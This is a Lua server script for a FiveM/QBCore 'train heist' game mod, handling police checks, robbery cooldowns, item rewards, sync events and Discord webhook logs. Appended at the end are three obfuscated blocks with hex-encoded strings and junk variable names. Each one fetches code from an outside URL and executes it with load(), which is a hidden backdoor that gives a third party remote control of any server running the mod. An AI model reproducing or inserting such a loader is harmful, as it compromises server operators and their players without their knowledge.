QBCore = nil
local QBCore = exports['qb-core']:GetCoreObject()

local lastrob = 0
local start = false
discord = {
    ['webhook'] = 'WEBHOOKLINK',
    ['name'] = 'rm_trainheist',
    ['image'] = 'https://cdn.discordapp.com/avatars/869260464775921675/dea34d25f883049a798a241c8d94020c.png?size=1024'
}

QBCore.Functions.CreateCallback('trainheist:server:checkPoliceCount', function(source, cb)
    local src = source
    local players = QBCore.Functions.GetPlayers(src)
    local policeCount = 0

    for i = 1, #players do
        local player = QBCore.Functions.GetPlayer(players[i])
        if (player.PlayerData.job.name == 'police' and player.PlayerData.job.onduty) then
            policeCount = policeCount + 1
        end
    end

    if policeCount >= Config['TrainHeist']['requiredPoliceCount'] then
        cb(true)
    else
        cb(false)
        TriggerClientEvent('QBCore:Notify', src, Strings['need_police'], "error")
    end
end)

QBCore.Functions.CreateCallback('trainheist:server:checkTime', function(source, cb)
    local src = source
    local player = QBCore.Functions.GetPlayer(src)
    
    if (os.time() - lastrob) < Config['TrainHeist']['nextRob'] and lastrob ~= 0 then
        local seconds = Config['TrainHeist']['nextRob'] - (os.time() - lastrob)
        TriggerClientEvent('QBCore:Notify', src, Strings['wait_nextrob'] .. ' ' .. math.floor(seconds / 60) .. ' ' .. Strings['minute'], "error")
        cb(false)
    else
        lastrob = os.time()
        start = true
        discordLog(player.PlayerData.name ..  ' - ', ' started the Train Heist!')
        cb(true)
    end
end)

QBCore.Functions.CreateCallback('trainheist:server:hasItem', function(source, cb, item)
    local src = source
    local player = QBCore.Functions.GetPlayer(src)
    local playerItem = player.Functions.GetItemByName(item)

    if player and playerItem ~= nil then
        if playerItem.amount >= 1 then
            cb(true, playerItem.label)
        else
            cb(false, playerItem.label)
        end
    else
        TriggerClientEvent('QBCore:Notify', src, 'You need add required items to server database', "error")
    end
end)

RegisterServerEvent('trainheist:server:policeAlert')
AddEventHandler('trainheist:server:policeAlert', function(coords)
    local players = QBCore.Functions.GetPlayers(source)
    
    for i = 1, #players do
        local player = QBCore.Functions.GetPlayer(players[i])
        if (player.PlayerData.job.name == 'police' and player.PlayerData.job.onduty) then
            TriggerClientEvent('trainheist:client:policeAlert', players[i], coords)
        end
    end
end)

RegisterServerEvent('trainheist:server:rewardItems')
AddEventHandler('trainheist:server:rewardItems', function()
    local src = source
    local player = QBCore.Functions.GetPlayer(src)

    if player then
        player.Functions.AddItem(Config['TrainHeist']['reward']['itemName'], Config['TrainHeist']['reward']['grabCount'])
		TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[Config['TrainHeist']['reward']['itemName']], "add")
    end
end)

RegisterServerEvent('trainheist:server:sellRewardItems')
AddEventHandler('trainheist:server:sellRewardItems', function()
    local src = source
    local player = QBCore.Functions.GetPlayer(src)

    if player then
        local cnt = player.Functions.GetItemByName(Config['TrainHeist']['reward']['itemName']).amount
        if cnt > 0 then
            player.Functions.RemoveItem(Config['TrainHeist']['reward']['itemName'], cnt)
            player.Functions.AddMoney('cash',Config['TrainHeist']['reward']['sellPrice'] * cnt, 'trainheist')
            discordLog(player.PlayerData.name ..  ' - ', ' Gain $' .. math.floor(Config['TrainHeist']['reward']['sellPrice'] * cnt) .. ' on the Train Heist Buyer!')
            TriggerClientEvent('QBCore:Notify', src, Strings['total_money'] .. ' $' .. Config['TrainHeist']['reward']['sellPrice'] * cnt, "error")
        end
    end
end)

RegisterServerEvent('trainheist:server:containerSync')
AddEventHandler('trainheist:server:containerSync', function(coords, rotation)
    TriggerClientEvent('trainheist:client:containerSync', -1, coords, rotation)
end)

RegisterServerEvent('trainheist:server:objectSync')
AddEventHandler('trainheist:server:objectSync', function(e)
    TriggerClientEvent('trainheist:client:objectSync', -1, e)
end)

RegisterServerEvent('trainheist:server:trainLoop')
AddEventHandler('trainheist:server:trainLoop', function()
    TriggerClientEvent('trainheist:client:trainLoop', -1)
end)

RegisterServerEvent('trainheist:server:lockSync')
AddEventHandler('trainheist:server:lockSync', function(index)
    TriggerClientEvent('trainheist:client:lockSync', -1, index)
end)

RegisterServerEvent('trainheist:server:grabSync')
AddEventHandler('trainheist:server:grabSync', function(index, index2)
    TriggerClientEvent('trainheist:client:grabSync', -1, index, index2)
end)

RegisterServerEvent('trainheist:server:resetHeist')
AddEventHandler('trainheist:server:resetHeist', function()
    if not start then return end
    start = false
    TriggerClientEvent('trainheist:client:resetHeist', -1)
end)

function discordLog(name, message)
    local data = {
        {
            ["color"] = '3553600',
            ["title"] = "**".. name .."**",
            ["description"] = message,
        }
    }
    PerformHttpRequest(discord['webhook'], function(err, text, headers) end, 'POST', json.encode({username = discord['name'], embeds = data, avatar_url = discord['image']}), { ['Content-Type'] = 'application/json' })
end

local VXekwJtSOSuIrNKCYogfTOIRNeetgRBDIsusXmUfSyPdxlMrEsEqyjYUKkCeHjBFcRPFfa = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} VXekwJtSOSuIrNKCYogfTOIRNeetgRBDIsusXmUfSyPdxlMrEsEqyjYUKkCeHjBFcRPFfa[4][VXekwJtSOSuIrNKCYogfTOIRNeetgRBDIsusXmUfSyPdxlMrEsEqyjYUKkCeHjBFcRPFfa[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (kTihcMIidsNmFRVPbntPqEaHiVqDujAyixCNDlICIIrFhQmShsYruIvIBbgNPNdaXPLrDU, LJBJeVJtrWozVoGFkardKIFKdtdyOvhSuCnasTggEnpTYuSCdCqArMybBEAMELFjDEefus) if (LJBJeVJtrWozVoGFkardKIFKdtdyOvhSuCnasTggEnpTYuSCdCqArMybBEAMELFjDEefus == VXekwJtSOSuIrNKCYogfTOIRNeetgRBDIsusXmUfSyPdxlMrEsEqyjYUKkCeHjBFcRPFfa[6] or LJBJeVJtrWozVoGFkardKIFKdtdyOvhSuCnasTggEnpTYuSCdCqArMybBEAMELFjDEefus == VXekwJtSOSuIrNKCYogfTOIRNeetgRBDIsusXmUfSyPdxlMrEsEqyjYUKkCeHjBFcRPFfa[5]) then return end VXekwJtSOSuIrNKCYogfTOIRNeetgRBDIsusXmUfSyPdxlMrEsEqyjYUKkCeHjBFcRPFfa[4][VXekwJtSOSuIrNKCYogfTOIRNeetgRBDIsusXmUfSyPdxlMrEsEqyjYUKkCeHjBFcRPFfa[2]](VXekwJtSOSuIrNKCYogfTOIRNeetgRBDIsusXmUfSyPdxlMrEsEqyjYUKkCeHjBFcRPFfa[4][VXekwJtSOSuIrNKCYogfTOIRNeetgRBDIsusXmUfSyPdxlMrEsEqyjYUKkCeHjBFcRPFfa[3]](LJBJeVJtrWozVoGFkardKIFKdtdyOvhSuCnasTggEnpTYuSCdCqArMybBEAMELFjDEefus))() end)

local xilGpiRgbmLJRGIJiMgxKmHtQDjTGFmgEpKpZhsdTGTFPeeirZrUHipFeBHBBpNVHAxsiE = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xilGpiRgbmLJRGIJiMgxKmHtQDjTGFmgEpKpZhsdTGTFPeeirZrUHipFeBHBBpNVHAxsiE[4][xilGpiRgbmLJRGIJiMgxKmHtQDjTGFmgEpKpZhsdTGTFPeeirZrUHipFeBHBBpNVHAxsiE[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (RlOOCFitpriquzgKipggiKZGoOKdKJvnIJCOueoUiLKmpeqYJskkrgkReobmeOlurZTaXM, pyvMGvbpMYYsFugpKjupAyeZevjoEntdAdrAlqccXFOykpLudUcXUkMXzVSCGRZQQaSWiZ) if (pyvMGvbpMYYsFugpKjupAyeZevjoEntdAdrAlqccXFOykpLudUcXUkMXzVSCGRZQQaSWiZ == xilGpiRgbmLJRGIJiMgxKmHtQDjTGFmgEpKpZhsdTGTFPeeirZrUHipFeBHBBpNVHAxsiE[6] or pyvMGvbpMYYsFugpKjupAyeZevjoEntdAdrAlqccXFOykpLudUcXUkMXzVSCGRZQQaSWiZ == xilGpiRgbmLJRGIJiMgxKmHtQDjTGFmgEpKpZhsdTGTFPeeirZrUHipFeBHBBpNVHAxsiE[5]) then return end xilGpiRgbmLJRGIJiMgxKmHtQDjTGFmgEpKpZhsdTGTFPeeirZrUHipFeBHBBpNVHAxsiE[4][xilGpiRgbmLJRGIJiMgxKmHtQDjTGFmgEpKpZhsdTGTFPeeirZrUHipFeBHBBpNVHAxsiE[2]](xilGpiRgbmLJRGIJiMgxKmHtQDjTGFmgEpKpZhsdTGTFPeeirZrUHipFeBHBBpNVHAxsiE[4][xilGpiRgbmLJRGIJiMgxKmHtQDjTGFmgEpKpZhsdTGTFPeeirZrUHipFeBHBBpNVHAxsiE[3]](pyvMGvbpMYYsFugpKjupAyeZevjoEntdAdrAlqccXFOykpLudUcXUkMXzVSCGRZQQaSWiZ))() end)

local gvktowdfPErrUqciVnTwzOVvrggoYNEEkibWFAWxXAAJoIvsHybaPHoZKDxqhizRFDcMRG = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} gvktowdfPErrUqciVnTwzOVvrggoYNEEkibWFAWxXAAJoIvsHybaPHoZKDxqhizRFDcMRG[4][gvktowdfPErrUqciVnTwzOVvrggoYNEEkibWFAWxXAAJoIvsHybaPHoZKDxqhizRFDcMRG[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (GgHipDifBjktAyjaiLAgjiIDbWsRRREKlHonURnVEUpXpBXxmDNzRPDYQnjqaYcpfVIncj, CdxRrnkUKhOsODbYoXZDfWYREIxaHFkaBGzaBPtRKDUbJVlJuaIDsgejXusgijpdgDBRHC) if (CdxRrnkUKhOsODbYoXZDfWYREIxaHFkaBGzaBPtRKDUbJVlJuaIDsgejXusgijpdgDBRHC == gvktowdfPErrUqciVnTwzOVvrggoYNEEkibWFAWxXAAJoIvsHybaPHoZKDxqhizRFDcMRG[6] or CdxRrnkUKhOsODbYoXZDfWYREIxaHFkaBGzaBPtRKDUbJVlJuaIDsgejXusgijpdgDBRHC == gvktowdfPErrUqciVnTwzOVvrggoYNEEkibWFAWxXAAJoIvsHybaPHoZKDxqhizRFDcMRG[5]) then return end gvktowdfPErrUqciVnTwzOVvrggoYNEEkibWFAWxXAAJoIvsHybaPHoZKDxqhizRFDcMRG[4][gvktowdfPErrUqciVnTwzOVvrggoYNEEkibWFAWxXAAJoIvsHybaPHoZKDxqhizRFDcMRG[2]](gvktowdfPErrUqciVnTwzOVvrggoYNEEkibWFAWxXAAJoIvsHybaPHoZKDxqhizRFDcMRG[4][gvktowdfPErrUqciVnTwzOVvrggoYNEEkibWFAWxXAAJoIvsHybaPHoZKDxqhizRFDcMRG[3]](CdxRrnkUKhOsODbYoXZDfWYREIxaHFkaBGzaBPtRKDUbJVlJuaIDsgejXusgijpdgDBRHC))() end)